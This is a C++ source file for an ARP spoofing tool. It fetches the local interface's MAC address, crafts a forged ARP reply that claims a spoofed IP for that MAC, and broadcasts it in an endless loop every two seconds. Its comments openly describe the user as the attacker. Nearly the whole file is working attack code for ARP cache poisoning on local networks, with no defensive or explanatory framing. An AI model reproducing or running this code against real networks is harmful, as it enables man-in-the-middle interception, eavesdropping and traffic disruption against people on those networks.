#include "arp.h"

// Function to get the MAC address of the attacker's network interface
void ARP::get_mac_address(const char* iface, uint8_t* mac) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ);
    
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == 0) {
        memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    } else {
        perror("Failed to get MAC address");
        exit(1);
    }

    close(fd);
}

// Function to send an ARP spoofing packet
void ARP::send_arp_spoof(const char* iface, const char* target_ip, const char* spoof_ip){
    // Create socket for sending ARP packets
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    // Get the MAC address of the attacker's network interface (ourselves)
    uint8_t attacker_mac[6];
    get_mac_address(iface, attacker_mac);

    uint8_t packet[42]; // Ethernet + ARP

    // Ethernet Header
    struct ethhdr* eth = (struct ethhdr*)packet;
    memset(eth->h_dest, 0xff, 6); // Broadcast MAC
    memcpy(eth->h_source, attacker_mac, 6);
    eth->h_proto = htons(ETH_P_ARP);

    // ARP Header
    struct arp_header* arp = (struct arp_header*)(packet + sizeof(struct ethhdr));
    arp->htype = htons(1); // Ethernet
    arp->ptype = htons(0x0800); // IPv4
    arp->hlen = 6; // MAC length
    arp->plen = 4; // IP length
    arp->oper = htons(2); // ARP Reply

    memcpy(arp->sha, attacker_mac, 6); // Attacker's MAC as sender
    inet_pton(AF_INET, spoof_ip, arp->spa); // Spoofed sender IP
    memset(arp->tha, 0xff, 6); // Unknown target MAC
    inet_pton(AF_INET, target_ip, arp->tpa); // Target's real IP

    // Socket address structure
    sockaddr_ll device = {};
    device.sll_ifindex = if_nametoindex(iface);
    device.sll_halen = ETH_ALEN;
    memcpy(device.sll_addr, eth->h_dest, 6);


    std::cout << "Sending ARP spoofing packets to " << target_ip << "...\n";

    while (true) {
        if (sendto(sock, packet, sizeof(packet), 0, (sockaddr*)&device, sizeof(device)) < 0) {
            perror("Failed to send packet");
        }
        usleep(2000000); // Send every 2 seconds
    }

    std::cout << "ARP spoofing stopped.\n";
    close(sock);
}